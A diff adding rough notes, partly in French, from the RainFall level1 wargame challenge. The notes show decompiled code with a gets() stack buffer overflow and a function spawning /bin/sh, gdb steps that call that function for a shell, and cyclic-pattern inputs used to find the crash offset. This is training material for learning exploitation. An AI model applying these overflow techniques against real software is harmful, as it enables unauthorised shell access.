@@ -1,0 +1,65 @@
+level1@RainFall:~$ ./level1 ethab
+d
+level1@RainFall:~$ ./level1
+d
+
+➜  level1 git:(main) ✗ scp -P 4242 level1@10.171.49.105:/home/user/level1/level1 .
+
+https://dogbolt.org/
+
+int run(void)
+{
+    fwrite("Good... Wait what?\n", 1, 19, stdout);
+    return system("/bin/sh");
+}
+
+char * main(void)
+{
+    char v0[64];  // [bp-0x44]
+
+    return gets(&v0);
+}
+
+compiler un main appelant run() ? 
+
+level1@RainFall:~$ objdump -d level1 | grep -A 20 "run"
+08048444 <run>:
+
+0x8048444
+
+(gdb) break _start 
+Breakpoint 1 at 0x8048390
+(gdb) run
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048390 in _start ()
+(gdb) 
+
+(gdb) call (void)0x8048444()
+Good... Wait what?
+$ whoami
+level1
+
+
+essaye plusieurs valeurs dans gets
+# 66 char
+
+level1@RainFall:~$ ./level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
+
+# 75char
+level1@RainFall:~$ ./level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4
+level1@RainFall:~$ 
+
+# 80 char
+level1@RainFall:~$ ./level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+Segmentation fault (core dumped)
+
+# 76 char
+level1@RainFall:~$ ./level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4d	
+Illegal instruction (core dumped)
+level1@RainFall:~$ 
+
